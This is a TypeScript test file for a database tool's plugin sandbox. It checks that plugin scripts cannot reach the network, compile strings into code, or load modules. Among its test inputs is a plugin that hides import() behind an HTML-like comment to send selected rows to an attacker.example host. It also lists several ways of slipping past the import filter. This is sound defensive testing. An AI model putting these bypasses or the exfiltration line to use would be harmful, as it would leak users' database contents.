import { describe, expect, it, vi } from "vitest";
import type { HostMessage, PluginSnapshot, WorkerMessage } from "./protocol";
import {
  BLOCKED_GLOBALS,
  blockGlobal,
  compilePlugin,
  createRuntime,
  lockdown,
  makeRow,
  SandboxError,
  scanSource,
} from "./runtime";

/** `node:vm` (tests run in Node; the app's tsconfig has no Node types, hence the local shape). */
interface Vm {
  createContext(sandbox: object): object;
  runInContext(code: string, context: object): unknown;
}
const vm = (await import(/* @vite-ignore */ `node:${"vm"}`)) as Vm;

/** A separate JS realm standing in for the worker: its own global, Function and prototypes. */
function realm() {
  const network = vi.fn(() => "reached the network");
  const proto = { importScripts: network, fetch: network };
  const global = Object.assign(Object.create(proto) as Record<string, unknown>, {
    XMLHttpRequest: network,
    WebSocket: network,
    EventSource: network,
    Worker: network,
    BroadcastChannel: network,
    indexedDB: { open: network },
    caches: { open: network },
    navigator: { userAgent: "test", language: "en", serviceWorker: { register: network } },
    setTimeout: (fn: unknown) => (typeof fn === "function" ? "scheduled" : "compiled a string"),
  });
  const context = vm.createContext(global);
  const FunctionCtor = vm.runInContext("Function", context) as FunctionConstructor;
  const prototypes = vm.runInContext(
    `[Function.prototype, Object.getPrototypeOf(async function () {}),
      Object.getPrototypeOf(function* () {}), Object.getPrototypeOf(async function* () {})]`,
    context,
  ) as object[];
  const scope = vm.runInContext("globalThis", context) as Record<string, unknown>;
  return { scope, FunctionCtor, prototypes, network };
}

/** Runs `code` as plugin code in a locked realm; resolves to what it returned or threw. */
async function runLocked(code: string) {
  const r = realm();
  const leaks = lockdown(r.scope, { prototypes: r.prototypes });
  const fn = compilePlugin(r.FunctionCtor, code, null);
  try {
    return { leaks, network: r.network, value: await fn(), error: null };
  } catch (error) {
    return { leaks, network: r.network, value: undefined, error: error as Error };
  }
}

describe("lockdown", () => {
  it("blocks the network, nested workers and shared storage", async () => {
    for (const call of [
      `fetch("https://example.com")`,
      `importScripts("https://example.com/x.js")`,
      `new XMLHttpRequest()`,
      `new WebSocket("wss://example.com")`,
      `new EventSource("/x")`,
      `new Worker("/x.js")`,
      `new BroadcastChannel("tabler")`,
      `indexedDB.open("x")`,
      `caches.open("x")`,
    ]) {
      const r = await runLocked(`return ${call};`);
      expect(r.leaks).toEqual([]);
      // The stubs throw; `indexedDB.open` / `caches.open` no longer exist at all.
      expect(r.error?.message, call).toMatch(/not available to plugins|is not a function/);
      expect(r.network).not.toHaveBeenCalled();
    }
  });

  it("keeps the plugin from putting a blocked global back", async () => {
    const r = await runLocked(`
      "use strict";
      try { globalThis.fetch = () => "mine"; } catch {}
      try { delete globalThis.fetch; } catch {}
      return typeof fetch === "function" ? String(fetch === globalThis.fetch) : "gone";
    `);
    expect(r.error).toBeNull();
    const again = await runLocked(`globalThis.fetch = () => "mine"; return fetch("x");`);
    expect(again.error?.message).toMatch(/not available to plugins/);
    expect(again.network).not.toHaveBeenCalled();
  });

  it("stops code generation, which could reach import()", async () => {
    for (const code of [
      `return eval("1 + 1")`,
      `return Function("return 1")()`,
      `return (function () {}).constructor("return 1")()`,
      `return (async function () {}).constructor("return 1")()`,
      `return (function* () {}).constructor("yield 1")().next()`,
      `return setTimeout("1 + 1", 0)`,
    ]) {
      const r = await runLocked(code);
      expect(r.error?.message, code).toMatch(/not available to plugins/);
    }
    // Bundlers look the global up this way; it still works (and finds the sandbox's global).
    const r = await runLocked(`return new Function("return this")() === globalThis;`);
    expect(r.value).toBe(true);
    expect((await runLocked(`return setTimeout(() => {}, 0)`)).value).toBe("scheduled");
  });

  it("keeps Function.prototype and instanceof Function working for libraries", async () => {
    const r = await runLocked(`
      const apply = Function.prototype.apply;
      return {
        call: typeof Function.prototype.call,
        apply: typeof Function.prototype.apply,
        bind: typeof Function.prototype.bind,
        max: apply.call(Math.max, null, [1, 2, 3]),
        bound: Function.prototype.call.bind(Math.min)(null, 4, 2),
        arrow: (() => {}) instanceof Function,
        plain: (function () {}) instanceof Function,
        notFn: ({}) instanceof Function,
        text: Function.prototype.toString.call(function f() {}),
        proto: Object.getPrototypeOf(function () {}) === Function.prototype,
        same: (function () {}).constructor === Function,
        name: Function.name,
      };
    `);
    expect(r.error).toBeNull();
    expect(r.value).toMatchObject({
      call: "function",
      apply: "function",
      bind: "function",
      max: 3,
      bound: 2,
      arrow: true,
      plain: true,
      notFn: false,
      proto: true,
      same: true,
      name: "Function",
    });
    expect((r.value as { text: string }).text).toContain("function f");
  });

  it("still blocks code generation after Function.prototype was restored", async () => {
    for (const code of [
      `return new Function("return 1+1")`,
      `return Function("return 1+1")`,
      `return (function () {}).constructor("x")`,
      `return Function.prototype.constructor("return 1")`,
      `return (async () => {}).constructor("return 1")`,
    ]) {
      const r = await runLocked(code);
      expect(r.error, code).toBeInstanceOf(SandboxError);
    }
    // The global lookup bundlers use keeps working.
    expect((await runLocked(`return new Function("return this")() === globalThis;`)).value).toBe(
      true,
    );
    // The plugin cannot swap the prototype back for something of its own.
    const swapped = await runLocked(`
      "use strict";
      try { Function.prototype = {}; } catch {}
      return Function.prototype === Object.getPrototypeOf(function () {});
    `);
    expect(swapped.value).toBe(true);
  });

  it("leaves navigator without its service workers", async () => {
    const r = await runLocked(`return [navigator.userAgent, typeof navigator.serviceWorker];`);
    expect(r.value).toEqual(["test", "undefined"]);
  });

  it("blocks a global defined on the prototype chain", () => {
    const proto = { fetch: () => "net" };
    const scope = Object.create(proto) as { fetch: () => string };
    expect(blockGlobal(scope, "fetch")).toBe(true);
    expect(() => scope.fetch()).toThrow(SandboxError);
    expect(Object.getOwnPropertyDescriptor(proto, "fetch")).toBeUndefined();
    expect(BLOCKED_GLOBALS).toContain("importScripts");
  });

  it("refuses scripts that load modules", () => {
    expect(scanSource(`const m = await import("https://x/y.js")`)).toMatch(/modules/);
    expect(scanSource(`import /* x */ ("y")`)).toMatch(/modules/);
    expect(scanSource(`console.log(import.meta)`)).toMatch(/modules/);
    expect(scanSource(`context.alert("importer", "important")`)).toBeNull();
  });

  it("refuses the word import anywhere, whatever sits between it and the parenthesis", () => {
    for (const code of [
      // HTML-like comments (Annex B) between `import` and `(`: the bypass of the old regex.
      `await import <!-- x\n("y")`,
      `await import\n--> x\n("y")`,
      `import/**/("y")`,
      `import//\n("y")`,
      `[...import("x")]`,
      `x = import ("y")`,
      `import.meta`,
      // Nothing is skipped: not comments, not strings, not property names.
      `// import (csv)`,
      `/* import */`,
      `context.alert("import (x)")`,
      `db.import(x)`,
      `const o = { import: 1 }`,
    ]) {
      expect(scanSource(code), code).toMatch(/word import is not allowed anywhere/);
    }
  });

  it("accepts words that only contain import", () => {
    for (const code of [
      `context.alert("importer", "important")`,
      `const reimport = 1`,
      `const Import = 2`,
      `const myimports = 3`,
      `const importance = 4; const imports = []`,
      `const _import = 1`,
    ]) {
      // `_import` is one word for the regex (the underscore is a word character).
      expect(scanSource(code), code).toBeNull();
    }
  });
});

const SNAPSHOT: PluginSnapshot = {
  source: "grid",
  driver: "PostgreSQL",
  connection: { name: "local", readOnly: false },
  item: { name: "users", schema: "public", type: "table" },
  clickedRow: { columns: ["id", "email"], values: [1, "a@x.io"] },
  clickedColumn: { name: "email", type: "text" },
  selectedRows: [
    { columns: ["id", "email"], values: [1, "a@x.io"] },
    { columns: ["id", "email"], values: [2, null] },
  ],
  sql: null,
};

/** A runtime wired to an in-process "app" that answers calls with `answer`. */
function harness(answer: (method: string, args: unknown[]) => unknown) {
  const posted: WorkerMessage[] = [];
  let finish!: (m: WorkerMessage) => void;
  const finished = new Promise<WorkerMessage>((r) => (finish = r));
  const runtime = createRuntime({
    post: (m) => {
      posted.push(m);
      if (m.type === "done" || m.type === "error") finish(m);
      if (m.type === "call") {
        Promise.resolve()
          .then(() => answer(m.method, m.args))
          .then(
            (value) => runtime.onMessage({ type: "reply", id: m.id, ok: true, value }),
            (e: Error) =>
              runtime.onMessage({ type: "reply", id: m.id, ok: false, error: e.message }),
          );
      }
    },
    compile: (code, handler) => compilePlugin(Function, code, handler),
    later: (fn) => void setTimeout(fn, 0),
    global: {},
  });
  const run = (code: string, handler: string | null = null) => {
    const msg: HostMessage = {
      type: "run",
      plugin: { identifier: "com.example.t", name: "T" },
      code,
      handler,
      snapshot: SNAPSHOT,
    };
    runtime.onMessage(msg);
    return finished;
  };
  return { run, posted };
}

describe("the plugin API", () => {
  it("reads the snapshot synchronously", async () => {
    const seen: unknown[] = [];
    const h = harness((method, args) => {
      seen.push([method, ...args]);
      return null;
    });
    const end = await h.run(`
      const row = context.clickedRow();
      await context.alert(context.currentItem().name, row.raw("email") + " " + context.selectedRows().length + " " + context.driver() + " " + context.clickedColumn().name);
    `);
    expect(end).toEqual({ type: "done" });
    expect(seen).toEqual([["alert", "users", "a@x.io 2 PostgreSQL email"]]);
  });

  it("hands a script the file the user picked through context.loadFile()", async () => {
    const seen: unknown[] = [];
    const h = harness((method, args) => {
      seen.push([method, ...args]);
      return method === "loadFile" ? { name: "data.csv", text: "a,b\n1,2" } : null;
    });
    const end = await h.run(`
      const file = await context.loadFile();
      if (!Object.isFrozen(file)) throw new Error("not frozen");
      await context.alert(file.name, file.text.split("\\n").length + " lines");
    `);
    expect(end).toEqual({ type: "done" });
    expect(seen).toEqual([["loadFile"], ["alert", "data.csv", "2 lines"]]);
    // A refused call (the user cancelled, a second call) rejects in the script.
    const refused = harness(() => {
      throw new Error("context.loadFile() can be called once per command run");
    });
    expect(await refused.run(`await context.loadFile()`)).toEqual({
      type: "error",
      message: "context.loadFile() can be called once per command run",
    });
  });

  it("waits for callback-style execute before finishing", async () => {
    const calls: string[] = [];
    const h = harness((method, args) => {
      calls.push(`${method}:${String(args[0])}`);
      return method === "execute" ? { columns: ["n"], rows: [[42]], rowsAffected: null } : null;
    });
    const end = await h.run(`
      context.execute("SELECT 42 AS n", (res) => {
        SystemService.insertToClipboard(String(res.rows[0].raw("n")));
      });
    `);
    expect(end).toEqual({ type: "done" });
    expect(calls).toEqual(["execute:SELECT 42 AS n", "insertToClipboard:42"]);
  });

  it("calls the handler the script defines", async () => {
    const seen: unknown[] = [];
    const h = harness((_m, args) => (seen.push(args[0]), null));
    await h.run(`function onRun(context) { return SystemService.notify("hi", ""); }`, "onRun");
    expect(seen).toEqual(["hi"]);
    const missing = harness(() => null);
    expect(await missing.run(`const x = 1;`, "onRun")).toEqual({
      type: "error",
      message: "The script does not define onRun()",
    });
  });

  it("refuses a script hiding import() behind an HTML-like comment before running anything", async () => {
    const h = harness(() => null);
    const end = await h.run(
      `context.alert("ran first", "");\nawait import <!-- x\n("https://attacker.example/c?d=" + JSON.stringify(context.selectedRows()))`,
    );
    expect(end).toMatchObject({ type: "error" });
    expect((end as { message: string }).message).toMatch(/word import is not allowed/);
    // Nothing ran: no bridge call was made, not even the alert before the import.
    expect(h.posted.filter((m) => m.type === "call")).toEqual([]);
  });

  it("reports errors: thrown, rejected calls, syntax", async () => {
    expect(await harness(() => null).run(`throw new Error("boom")`)).toEqual({
      type: "error",
      message: "boom",
    });
    const refused = harness(() => {
      throw new Error("The query was not sent");
    });
    expect(await refused.run(`await context.execute("DELETE FROM users")`)).toEqual({
      type: "error",
      message: "The query was not sent",
    });
    const syntax = await harness(() => null).run(`this is not javascript`);
    expect(syntax.type).toBe("error");
  });

  it("gives rows a raw() accessor", () => {
    const row = makeRow({ columns: ["a", "b"], values: [1, null] });
    expect(row.raw("a")).toBe(1);
    expect(row.raw("b")).toBeNull();
    expect(row.raw("c")).toBeUndefined();
    expect(Object.isFrozen(row)).toBe(true);
  });
});
